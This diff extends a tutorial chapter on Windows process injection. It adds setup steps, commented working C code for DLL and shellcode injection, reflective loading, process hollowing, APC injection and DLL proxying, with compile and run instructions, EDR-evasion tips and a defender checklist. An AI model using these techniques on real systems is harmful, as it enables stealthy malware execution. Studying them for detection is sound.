@@ -32,6 +32,206 @@ is short enough that it doesn't matter.
 
 ---
 
+## WINDOWS SETUP
+
+Everything in this chapter requires compiling C code and working with
+low-level Windows APIs. You come from Python. Here is exactly how to
+get every tool running before you touch a single section below.
+
+### Tools Required
+
+| Tool | Purpose | Admin Required |
+|------|---------|---------------|
+| Visual Studio Build Tools | C compiler (cl.exe) for all C code in this chapter | YES |
+| MinGW-w64 (gcc) | Alternative C compiler, lighter install | No |
+| Process Hacker 2 | Inspect process memory, threads, module lists | YES (some features) |
+| Sysmon | Kernel telemetry — logs injection artefacts | YES |
+| x64dbg | Debugger — inspect running processes | No |
+| msfvenom / Metasploit | Generate shellcode for Section 2 | No (WSL2) |
+| sRDI | Convert DLL to shellcode | No |
+| PE-bear | Parse PE headers visually | No |
+| Process Monitor (ProcMon) | Watch DLL search order in real time | YES |
+
+---
+
+### Install Commands
+
+#### Option A — MinGW-w64 (Recommended for Python devs, no IDE bloat)
+
+```powershell
+# Install winget if not already present (it is on Win11 by default)
+winget install --id MSYS2.MSYS2 -e
+```
+
+After MSYS2 installs, open the MSYS2 UCRT64 terminal from Start Menu and run:
+
+```bash
+pacman -S mingw-w64-ucrt-x86_64-gcc
+```
+
+Then add MinGW to your Windows PATH. In PowerShell (admin):
+
+```powershell
+$mingwPath = "C:\msys64\ucrt64\bin"
+[System.Environment]::SetEnvironmentVariable("PATH", $env:PATH + ";$mingwPath", "Machine")
+```
+
+Close and reopen PowerShell. Verify:
+
+```powershell
+gcc --version
+# Expected output: gcc.exe (Rev..., Built by MSYS2 project) 13.x.x or higher
+```
+
+#### Option B — Visual Studio Build Tools (cl.exe, Microsoft compiler)
+
+```powershell
+winget install --id Microsoft.VisualStudio.2022.BuildTools -e
+```
+
+After install, use "Developer Command Prompt for VS 2022" from Start Menu
+for all compile commands. Verify:
+
+```cmd
+cl
+# Expected output: Microsoft (R) C/C++ Optimizing Compiler Version 19.xx...
+```
+
+---
+
+#### Process Hacker 2
+
+```powershell
+winget install --id ProcessHacker.ProcessHacker -e
+```
+
+> WARNING: Process Hacker requires admin rights to inspect process memory
+> and view full module lists. Always right-click → Run as administrator.
+
+Verify: Open Process Hacker. You should see a full process list with PIDs
+and CPU/memory columns. If it shows "Access Denied" on system processes,
+you are not running as admin.
+
+---
+
+#### Sysmon (for Detection Exercises)
+
+Download from Microsoft Sysinternals:
+
+```powershell
+Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:TEMP\Sysmon.zip"
+Expand-Archive "$env:TEMP\Sysmon.zip" -DestinationPath "$env:TEMP\Sysmon"
+```
+
+Install with a basic config (admin PowerShell):
+
+```powershell
+cd "$env:TEMP\Sysmon"
+.\Sysmon64.exe -accepteula -i
+# Expected output: Sysmon64 installed. Process Monitor logging started.
+```
+
+> WARNING: Requires admin. Once installed, Sysmon logs to Windows Event Log
+> under: Applications and Services Logs > Microsoft > Windows > Sysmon > Operational
+
+---
+
+#### x64dbg
+
+```powershell
+winget install --id x64dbg.x64dbg -e
+```
+
+Verify: Launch x64dbg from Start Menu. You should see a dark-themed debugger
+window with CPU/Memory tabs across the top.
+
+---
+
+#### msfvenom (WSL2 required)
+
+msfvenom is a Linux tool. You need WSL2 first:
+
+```powershell
+# Run in PowerShell as Administrator
+wsl --install
+# Reboot when prompted, then set up Ubuntu username/password
+```
+
+After reboot, open Ubuntu from Start Menu and install Metasploit:
+
+```bash
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+chmod 755 msfinstall
+./msfinstall
+```
+
+Verify (inside WSL2 Ubuntu terminal):
+
+```bash
+msfvenom --version
+# Expected output: MsfVenom - a Metasploit standalone payload generator.
+# Framework Version: 6.x.x-dev
+```
+
+---
+
+#### sRDI
+
+```powershell
+git clone https://github.com/monoxgas/sRDI
+cd sRDI
+pip install pefile    # Python dependency
+python ShellcodeRDI.py --help
+# Expected output: usage: ShellcodeRDI.py [-h] [-v] [-d] ...
+```
+
+---
+
+#### PE-bear
+
+Download from: https://github.com/hasherezade/pe-bear/releases
+
+No install required — unzip and run `PE-bear.exe` directly.
+
+---
+
+#### Process Monitor (ProcMon)
+
+```powershell
+Invoke-WebRequest -Uri "https://download.sysinternals.com/files/ProcessMonitor.zip" -OutFile "$env:TEMP\ProcMon.zip"
+Expand-Archive "$env:TEMP\ProcMon.zip" -DestinationPath "C:\Tools\ProcMon"
+```
+
+Verify: Run `C:\Tools\ProcMon\Procmon64.exe`. Accept the EULA. You should
+see a live stream of system events. Press Ctrl+E to stop capture.
+
+---
+
+### How to Compile Every C Example in This Chapter
+
+All C code blocks use Windows APIs. Use this compile command template
+(MinGW / gcc):
+
+```powershell
+gcc -o output.exe source.c -lkernel32 -lntdll -lpsapi
+```
+
+For code using `winternl.h` (process hollowing, Section 4):
+
+```powershell
+gcc -o hollow.exe hollow.c -lkernel32 -lntdll
+```
+
+If you get "undefined reference" errors, add the relevant lib flag:
+- Missing `CreateToolhelp32Snapshot`: add `-lkernel32`
+- Missing `NtQueryInformationProcess`: add `-lntdll`
+
+> WARNING: These programs manipulate other processes. Run them in a VM
+> or isolated lab environment. Do NOT run injection code on your daily
+> driver Windows install unless you understand exactly what you are doing.
+
+---
+
 ## Section 1 — Classic DLL Injection
 
 The grandfather of code injection. Four API calls. Works on every
@@ -63,38 +263,52 @@ it in the remote CreateRemoteThread call.
 ### Implementation
 
 ```c
-#include <windows.h>
-#include <tlhelp32.h>
-#include <stdio.h>
+#include <windows.h>      // Core Windows API types and functions
+#include <tlhelp32.h>     // CreateToolhelp32Snapshot, PROCESSENTRY32
+#include <stdio.h>        // printf
 
+// Walk the process list and return the PID of the first process
+// whose name matches proc_name (case-insensitive)
 DWORD get_pid_by_name(const char *proc_name) {
+    // Take a snapshot of all running processes
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    PROCESSENTRY32 pe = { sizeof(pe) };
-    if (Process32First(snap, &pe)) {
+    PROCESSENTRY32 pe = { sizeof(pe) };    // Must set dwSize before first call
+    if (Process32First(snap, &pe)) {       // Seed the iterator
         do {
+            // Case-insensitive compare against target name
             if (_stricmp(pe.szExeFile, proc_name) == 0) {
                 CloseHandle(snap);
-                return pe.th32ProcessID;
+                return pe.th32ProcessID;   // Found — return the PID
             }
-        } while (Process32Next(snap, &pe));
+        } while (Process32Next(snap, &pe)); // Advance to next entry
     }
     CloseHandle(snap);
-    return 0;
+    return 0;  // Not found
 }
 
+// Open the target process, write a DLL path into it,
+// and create a remote thread that calls LoadLibraryA on that path
 int inject_dll(DWORD pid, const char *dll_path) {
+    // Open a handle to the target process with full access rights
     HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!proc) return 1;
+    if (!proc) return 1;  // Fails if process is higher integrity or protected
 
+    // +1 for the null terminator that LoadLibraryA requires
     size_t path_len = strlen(dll_path) + 1;
 
+    // Allocate a buffer inside the TARGET process's address space
+    // PAGE_READWRITE — we only need to write the path string here, not execute it
     LPVOID remote_buf = VirtualAllocEx(
         proc, NULL, path_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
     );
     if (!remote_buf) { CloseHandle(proc); return 1; }
 
+    // Copy the DLL path string from OUR process into the TARGET process
     WriteProcessMemory(proc, remote_buf, dll_path, path_len, NULL);
 
+    // Create a thread in the target process that starts at LoadLibraryA
+    // LoadLibraryA's argument is a pointer to a string — remote_buf IS that string
+    // kernel32.dll is at the same address in every process (no per-process ASLR)
     HANDLE thread = CreateRemoteThread(
         proc, NULL, 0,
         (LPTHREAD_START_ROUTINE)GetProcAddress(
@@ -104,7 +318,7 @@ int inject_dll(DWORD pid, const char *dll_path) {
     );
     if (!thread) { CloseHandle(proc); return 1; }
 
-    WaitForSingleObject(thread, INFINITE);
+    WaitForSingleObject(thread, INFINITE);  // Block until DLL is loaded
     CloseHandle(thread);
     CloseHandle(proc);
     return 0;
@@ -118,6 +332,38 @@ int main(int argc, char **argv) {
     return inject_dll(pid, "C:\\Users\\Public\\payload.dll");
 }
 ```
+
+#### Compile and Run
+
+```powershell
+# Compile (MinGW)
+gcc -o dll_inject.exe dll_inject.c -lkernel32
+
+# Run — requires payload.dll to exist at C:\Users\Public\payload.dll
+.\dll_inject.exe
+```
+
+#### Expected Output
+
+Success:
+```
+[*] injecting into PID 8432
+```
+Then open Process Hacker → find explorer.exe → right-click → Properties →
+Modules tab → `payload.dll` should appear in the list.
+
+Failure looks like:
+```
+[-] target not found
+```
+Means explorer.exe is not running (unlikely) or your process name string
+has a typo — check the exact name in Task Manager.
+
+Failure looks like `inject_dll` returning 1 silently — means
+`OpenProcess` failed. Run your injector as Administrator or target a
+process at the same integrity level as yours.
+
+---
 
 ### Required Privileges
 
@@ -219,28 +465,65 @@ Custom — write your own:
     Must resolve all APIs dynamically at runtime
 ```
 
+### Generating Test Shellcode (calc.exe spawner — safe, no network)
+
+Run this inside WSL2:
+
+```bash
+# Generate shellcode that pops calc.exe — safe for lab testing
+msfvenom -p windows/x64/exec CMD="calc.exe" -f c -o shellcode.h
+```
+
+#### Expected Output
+
+```
+[-] No platform was selected, choosing Msf::Module::Platform::Windows...
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 276 bytes
+Final size of c file: 1186 bytes
+Saved as: shellcode.h
+```
+
+Failure looks like: `No such payload` — means you typed the platform wrong.
+Use `msfvenom --list payloads | grep exec` to find the exact name.
+
+Copy `shellcode.h` from your WSL2 home to Windows:
+
+```bash
+# Inside WSL2
+cp shellcode.h /mnt/c/Users/Public/shellcode.h
+```
+
 ### Two-Stage Allocation (Stealth Improvement)
 
 ```c
-// Stage 1: Allocate RW, write shellcode
+// Stage 1: Allocate RW only — write shellcode into it
+// PAGE_READWRITE means this region can't execute yet (safer, less detectable)
 LPVOID remote_buf = VirtualAllocEx(
     proc, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
 );
 WriteProcessMemory(proc, remote_buf, shellcode, shellcode_len, NULL);
 
-// Stage 2: Flip to RX (no RWX region — lower detection signal)
+// Stage 2: Flip permissions from RW to RX
+// Separating write and execute phases avoids the RWX red flag
 DWORD old_protect;
 VirtualProtectEx(proc, remote_buf, shellcode_len, PAGE_EXECUTE_READ, &old_protect);
 
-// Stage 3: Execute
+// Stage 3: Execute — thread starts at the shellcode address
 CreateRemoteThread(proc, NULL, 0,
     (LPTHREAD_START_ROUTINE)remote_buf, NULL, 0, NULL
 );
 ```
 
-Why this matters: a RWX region (read + write + execute simultaneously) is
-a major EDR red flag. Memory that was written and then made executable is
-still suspicious — but less so than a region that was always RWX.
+#### Expected Output
+
+If shellcode is `calc.exe` spawner: Calculator opens on the desktop.
+You will see it as a child process of your target process in Process Hacker.
+
+Failure looks like: nothing happens, `CreateRemoteThread` returns NULL.
+Call `GetLastError()` to diagnose — error 5 = Access Denied (wrong
+integrity level), error 87 = invalid parameter (shellcode_len is 0).
 
 ### Detection Artefacts
 
@@ -306,60 +589,80 @@ python3 ShellcodeRDI.py payload.dll
 # No file on disk
 ```
 
+#### Expected Output
+
+```
+[*] Shellcode size: 14336 bytes
+[*] Saved to: payload.bin
+```
+
+Failure looks like: `ImportError: No module named pefile` — run
+`pip install pefile` first.
+
+Failure looks like: `Error: DLL not found` — check your path to
+`payload.dll` is correct and the file exists.
+
 ### Writing Your Own ReflectiveLoader
 
 The core logic in pseudocode:
 
 ```c
 // This function is exported as "ReflectiveLoader"
-// It receives no arguments — must find its own location
+// It receives no arguments — must find its own location in memory
 ULONG_PTR WINAPI ReflectiveLoader(void) {
 
     // Step 1: Find our own base address
-    // Walk backward from RIP until we hit the MZ signature
+    // We are position-independent — we cannot use globals or hardcoded addresses
+    // Walk backward from the current instruction pointer until we hit 'MZ' (0x5A4D)
     ULONG_PTR rip;
-    __asm__ __volatile__("lea %0, [rip]" : "=r"(rip));
+    __asm__ __volatile__("lea %0, [rip]" : "=r"(rip));  // Get current RIP value
     ULONG_PTR base = rip;
-    while (*(WORD*)base != 0x5A4D) base--;  // 'MZ'
+    while (*(WORD*)base != 0x5A4D) base--;  // 'MZ' = start of any PE file
 
-    // Step 2: Parse PE headers
+    // Step 2: Parse PE headers — same layout as any Windows executable
+    // 0x3C offset in the DOS header points to the NT headers offset
     IMAGE_NT_HEADERS *nt = (void*)(base + *(DWORD*)(base + 0x3C));
-    IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt);
+    IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt);  // Macro in winnt.h
 
-    // Step 3: Allocate new home
+    // Step 3: Allocate a new home for ourselves in the target process
+    // Try the preferred base first — if taken, Windows will pick another address
     ULONG_PTR new_base = (ULONG_PTR)VirtualAlloc(
         (void*)nt->OptionalHeader.ImageBase,
-        nt->OptionalHeader.SizeOfImage,
+        nt->OptionalHeader.SizeOfImage,    // Full virtual size including section gaps
         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
     );
 
-    // Step 4: Copy headers + sections
+    // Step 4: Copy PE headers to new location (needed for our own parsing later)
     memcpy((void*)new_base, (void*)base, nt->OptionalHeader.SizeOfHeaders);
+
+    // Copy each section (code, data, resources, etc.) to its virtual address
     for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
         memcpy(
-            (void*)(new_base + sections[i].VirtualAddress),
-            (void*)(base + sections[i].PointerToRawData),
+            (void*)(new_base + sections[i].VirtualAddress),   // Destination in new allocation
+            (void*)(base + sections[i].PointerToRawData),     // Source from original bytes
             sections[i].SizeOfRawData
         );
     }
 
-    // Step 5: Base relocations
+    // Step 5: Apply base relocations
+    // If we didn't land at our preferred ImageBase, all absolute addresses are wrong
+    // delta = how far off we are from preferred base
     ULONG_PTR delta = new_base - nt->OptionalHeader.ImageBase;
     // ... walk IMAGE_DIRECTORY_ENTRY_BASERELOC, apply delta to each entry
 
     // Step 6: Resolve imports
-    // Walk IMAGE_DIRECTORY_ENTRY_IMPORT
-    // Find each DLL in PEB.Ldr by name hash (avoid GetModuleHandle string)
-    // Find each function by walking export directory
-    // Write resolved addresses into IAT
+    // Walk IMAGE_DIRECTORY_ENTRY_IMPORT for each DLL we depend on
+    // Find each DLL in PEB.Ldr by name hash (avoid GetModuleHandle — its string is detectable)
+    // Find each function by walking that DLL's export directory
+    // Write resolved function addresses into our Import Address Table (IAT)
 
-    // Step 7: Execute
+    // Step 7: Call our own entry point — we are now fully mapped and ready
     DllEntryPoint = (BOOL(WINAPI*)(HINSTANCE,DWORD,LPVOID))(
         new_base + nt->OptionalHeader.AddressOfEntryPoint
     );
     DllEntryPoint((HINSTANCE)new_base, DLL_PROCESS_ATTACH, NULL);
 
-    return new_base;
+    return new_base;  // Return our new base so the injector knows where we landed
 }
 ```
 
@@ -368,10 +671,13 @@ ULONG_PTR WINAPI ReflectiveLoader(void) {
 ```
 Not in PEB module list                — breaks module enumeration tools
                                         Detected by: !lmi in WinDbg, memory scanners
+
 Memory with RWX permissions           — VirtualAlloc RWX flag
                                         Detected by: Process Hacker, memory scanners
+
 PE headers in non-module memory       — YARA: MZ+PE signature in heap
                                         Detected by: EDR memory scanning
+
 Private memory with executable code   — anomaly vs normal DLL-mapped regions
                                         Detected by: VAD (Virtual Address Descriptor)
                                         analysis — no corresponding file mapping
@@ -421,80 +727,110 @@ ResumeThread(main_thread)
 ### Implementation
 
 ```c
-#include <windows.h>
-#include <winternl.h>
+#include <windows.h>      // Core Windows API
+#include <winternl.h>     // PROCESS_BASIC_INFORMATION, NtQueryInformationProcess
 
-// Function pointer for NtUnmapViewOfSection (undocumented, in ntdll.dll)
+// NtUnmapViewOfSection is not in any import library — must get it at runtime
 typedef NTSTATUS (WINAPI *pfnNtUnmapViewOfSection)(HANDLE, PVOID);
 
 void hollow_process(const char *target_path, BYTE *payload, DWORD payload_size) {
-    STARTUPINFOA si = { sizeof(si) };
-    PROCESS_INFORMATION pi;
+    STARTUPINFOA si = { sizeof(si) };   // Must zero-init and set cb field
+    PROCESS_INFORMATION pi;             // Receives handles to new process and thread
 
-    // Step 1: Create target process suspended
+    // Step 1: Spawn target process in suspended state
+    // CREATE_SUSPENDED = main thread is created but doesn't run yet
     if (!CreateProcessA(target_path, NULL, NULL, NULL, FALSE,
                         CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
         return;
     }
 
-    // Step 2: Get ImageBase from PEB
+    // Step 2: Query the target process to find where its PEB lives
     PROCESS_BASIC_INFORMATION pbi;
     NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
                               &pbi, sizeof(pbi), NULL);
 
+    // PEB + 0x10 = the ImageBaseAddress field (offset is fixed across Win versions)
     PVOID peb_image_base_addr = (PBYTE)pbi.PebBaseAddress + 0x10;
     PVOID image_base;
+    // Read the ImageBase value out of the target process's PEB
     ReadProcessMemory(pi.hProcess, peb_image_base_addr,
                       &image_base, sizeof(image_base), NULL);
 
-    // Step 3: Unmap the original image
+    // Step 3: Unmap (hollow out) the original executable from the process
+    // NtUnmapViewOfSection is undocumented — must resolve from ntdll at runtime
     pfnNtUnmapViewOfSection NtUnmap =
         (pfnNtUnmapViewOfSection)GetProcAddress(
             GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"
         );
-    NtUnmap(pi.hProcess, image_base);
+    NtUnmap(pi.hProcess, image_base);   // Remove the original image mapping
 
-    // Step 4: Parse payload PE headers
+    // Step 4: Parse our payload's PE headers to know its size and preferred base
+    // 0x3C = e_lfanew field in IMAGE_DOS_HEADER — offset to NT headers
     IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS*)(payload + *(DWORD*)(payload + 0x3C));
     DWORD payload_img_size = nt->OptionalHeader.SizeOfImage;
     PVOID preferred_base = (PVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase;
 
-    // Step 5: Allocate space in target
+    // Step 5: Allocate space in the now-hollow process for our payload
     PVOID new_base = VirtualAllocEx(
         pi.hProcess, preferred_base, payload_img_size,
         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
     );
 
-    // Step 6: Write payload PE headers
+    // Step 6: Write payload PE headers (not sections yet, just the header block)
     WriteProcessMemory(pi.hProcess, new_base, payload,
                        nt->OptionalHeader.SizeOfHeaders, NULL);
 
-    // Step 7: Write each section
-    IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt);
+    // Step 7: Write each section of the payload to its virtual address
+    IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt); // Macro: points past OptionalHeader
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
-        PVOID dest = (PBYTE)new_base + sections[i].VirtualAddress;
-        PVOID src  = payload + sections[i].PointerToRawData;
+        PVOID dest = (PBYTE)new_base + sections[i].VirtualAddress;  // Where it lives in memory
+        PVOID src  = payload + sections[i].PointerToRawData;         // Where it lives on disk
         WriteProcessMemory(pi.hProcess, dest, src,
                            sections[i].SizeOfRawData, NULL);
     }
 
-    // Step 8: Update PEB.ImageBase to point to new base
+    // Step 8: Update PEB.ImageBaseAddress to reflect our new payload's base
+    // Without this, tools reading the PEB will see the old (now-gone) base address
     WriteProcessMemory(pi.hProcess, peb_image_base_addr,
                        &new_base, sizeof(new_base), NULL);
 
-    // Step 9: Set entry point via thread context
+    // Step 9: Redirect the suspended main thread's RIP to our payload's entry point
+    // RCX = first argument to the entry point (which is the HINSTANCE)
     CONTEXT ctx;
-    ctx.ContextFlags = CONTEXT_FULL;
+    ctx.ContextFlags = CONTEXT_FULL;    // Request all registers
     GetThreadContext(pi.hThread, &ctx);
     ctx.Rcx = (DWORD64)((PBYTE)new_base + nt->OptionalHeader.AddressOfEntryPoint);
     SetThreadContext(pi.hThread, &ctx);
 
-    // Step 10: Resume
+    // Step 10: Let the thread run — it now executes OUR payload, not the original binary
     ResumeThread(pi.hThread);
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
 }
 ```
+
+#### Compile
+
+```powershell
+gcc -o hollow.exe hollow.c -lkernel32 -lntdll
+```
+
+#### Expected Output
+
+When the hollow succeeds: the target binary (e.g., notepad.exe) appears
+in Task Manager with its normal name, but in Process Hacker → Memory tab
+the sections will NOT match the on-disk notepad.exe binary. The PE headers
+in memory will belong to your payload.
+
+Failure looks like: target process crashes immediately on resume. Common
+cause: payload's preferred ImageBase is different from where it actually
+landed — you need to apply base relocations before resuming. This is left
+as an exercise (the .reloc section must be walked and patched).
+
+Failure looks like: `NtUnmap` is NULL — means GetProcAddress failed.
+Check you are calling `GetModuleHandleA("ntdll.dll")` not "ntdll" (no extension causes failure on some configs).
+
+---
 
 ### Choosing The Target Binary
 
@@ -569,21 +905,23 @@ Shellcode executes in context of target thread
 Not all threads enter alertable states. You need to find one that does.
 
 ```c
-// Enumerate threads of target process
-HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+// Enumerate threads of target process to find candidates for APC injection
+HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);  // Snapshot all threads
 THREADENTRY32 te = { sizeof(te) };
 DWORD target_pid = ...; // your target
 
 if (Thread32First(snap, &te)) {
     do {
+        // Filter to only threads belonging to our target process
         if (te.th32OwnerProcessID == target_pid) {
             // Queue APC to every thread — at least one will be alertable
+            // THREAD_SET_CONTEXT = minimum right needed to queue an APC
             HANDLE thread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
             if (thread) {
                 QueueUserAPC(
-                    (PAPCFUNC)shellcode_remote_addr,
+                    (PAPCFUNC)shellcode_remote_addr,  // Address in target process's memory
                     thread,
-                    0
+                    0   // No argument passed to the APC function
                 );
                 CloseHandle(thread);
             }
@@ -605,20 +943,23 @@ This means the EDR has had zero opportunity to observe the process, hook
 its APIs, or baseline its state.
 
 ```c
-// Create process suspended
+// Create process suspended — not a single instruction has run yet
 CreateProcessA(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,
                NULL, NULL, &si, &pi);
 
-// Alloc + write shellcode BEFORE the process runs anything
+// Allocate and write shellcode BEFORE the process has had a chance to run
+// PAGE_EXECUTE_READWRITE for simplicity in this example
 LPVOID remote_buf = VirtualAllocEx(
     pi.hProcess, NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE
 );
 WriteProcessMemory(pi.hProcess, remote_buf, shellcode, shellcode_len, NULL);
 
-// Queue APC to the main thread (still suspended)
+// Queue APC to the main thread (which is still suspended)
+// When the thread wakes up and calls NtTestAlert, this fires first
 QueueUserAPC((PAPCFUNC)remote_buf, pi.hThread, 0);
 
-// Resume — first thing main thread does is drain APC queue
+// Resume — the FIRST thing the main thread does is drain the APC queue
+// Your shellcode runs before any of the target's own initialization code
 ResumeThread(pi.hThread);
 ```
 
@@ -723,12 +1064,13 @@ for understanding creative injection paths.
 ```
 
 ```c
-// Example: store shellcode bytes as atom names
+// Store shellcode bytes as atom names — atoms are globally accessible strings
 ATOM atoms[64];
 for (int i = 0; i < chunk_count; i++) {
-    // Pack shellcode chunk into null-padded string
+    // Pack one chunk of shellcode bytes into a wide string (null-padded)
     wchar_t atom_name[256] = {0};
     memcpy(atom_name, shellcode + (i * CHUNK_SIZE), CHUNK_SIZE);
+    // GlobalAddAtomW stores the string in the kernel's global atom table
     atoms[i] = GlobalAddAtomW(atom_name);
 }
 
@@ -789,15 +1131,37 @@ python generate.py -d C:\Windows\System32\winhttp.dll
 ```
 
 ```c
-// DllMain in your proxy DLL
+// DllMain in your proxy DLL — this runs when any process loads your fake DLL
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpvReserved) {
     if (reason == DLL_PROCESS_ATTACH) {
-        // Run payload code here
+        // DLL_PROCESS_ATTACH fires once when the DLL is first loaded
+        // This is where you run your payload code
         CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
     }
-    return TRUE;
+    return TRUE;   // Must return TRUE or the DLL load fails and the app crashes
 }
 ```
+
+#### Compile Your Proxy DLL
+
+```powershell
+# Compile as a DLL (not an EXE) using MinGW
+# -shared = output a DLL
+# winhttp.def = your DEF file that forwards all exports to the real DLL
+gcc -shared -o winhttp.dll proxy_main.c winhttp.def -lkernel32
+```
+
+#### Expected Output
+
+Place `winhttp.dll` in the same folder as the target application, then
+launch the application. In Process Hacker → target process → Modules:
+you should see your proxy DLL loaded from the application directory,
+not from System32. Your payload thread should be visible in the Threads tab.
+
+Failure looks like: application crashes on startup — your DLL loaded but
+a forwarded function failed. Check the .def file covers ALL exports from
+the real DLL. Use `dumpbin /exports C:\Windows\System32\winhttp.dll` to
+list every function that must be forwarded.
 
 ### Hijack Search Order Targets
 
@@ -905,6 +1269,58 @@ General principles:
 
 ---
 
+## DEFENDER TAKEAWAY
+
+You just learned nine ways attackers push code into processes they don't
+own. Here is what you do Monday morning to make every one of these harder
+to pull off and easier to catch.
+
+- **Deploy Sysmon with a tuned config and watch Event ID 8 (CreateRemoteThread)
+  and Event ID 10 (ProcessAccess).** These two events catch classic DLL
+  injection and shellcode injection before they finish. The SwiftOnSecurity
+  Sysmon config is a free starting point:
+  `https://github.com/SwiftOnSecurity/sysmon-config`
+
+- **Enable Windows Event ID 4688 (Process Creation) with command-line
+  logging.** Group Policy: Computer Configuration → Administrative Templates
+  → System → Audit Process Creation → "Include command line in process
+  creation events." Hollowed processes show a mismatch between the image
+  path in 4688 and what memory forensics shows is actually running.
+
+- **Block unsigned DLLs in application directories.** Use Windows Defender
+  Application Control (WDAC) or AppLocker DLL rules to prevent unsigned
+  DLLs from loading. This kills DLL proxying and search order hijacking
+  for any application that participates in the policy.
+
+- **Enable Process Protection (PPL) for sensitive processes.** lsass.exe
+  can be run as a PPL through Group Policy or registry:
+  `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` → `RunAsPPL = 1`
+  This makes OpenProcess return ACCESS_DENIED for all injection attempts.
+
+- **Baseline your process module lists.** Know which DLLs every sensitive
+  process should have loaded. Anything outside that list at runtime is
+  a detection signal. EDRs do this automatically — if you don't have an
+  EDR, Process Hacker and a scheduled task can export module lists for
+  manual comparison.
+
+- **Hunt for RWX memory regions in live processes.** Normal processes do
+  not have memory that is simultaneously readable, writable, and executable.
+  Any RWX region in a long-running process is a red flag. Process Hacker →
+  any process → Memory tab → filter for "RWX" in the Protection column.
+
+- **Audit alertable wait patterns in critical processes.** Standard user
+  processes that spend time in `SleepEx` or `WaitForSingleObjectEx` are
+  APC injection targets. If a process has no business entering alertable
+  waits, that behavior change is detectable via ETW.
+
+- **Run Volatility `malfind` against memory dumps from incident systems.**
+  `malfind` hunts for PE headers in non-module memory — the exact signature
+  of reflective DLL injection and process hollowing. It does not require
+  live access. Add it to your incident response runbook alongside standard
+  triage steps.
+
+---
+
 ## Key Terms
 
 | Term | Definition |
@@ -965,4 +1381,3 @@ you can't suppress it.
 
 — cold steel forged in memory,
 every THREAD a wire drawn through someone else's house
-
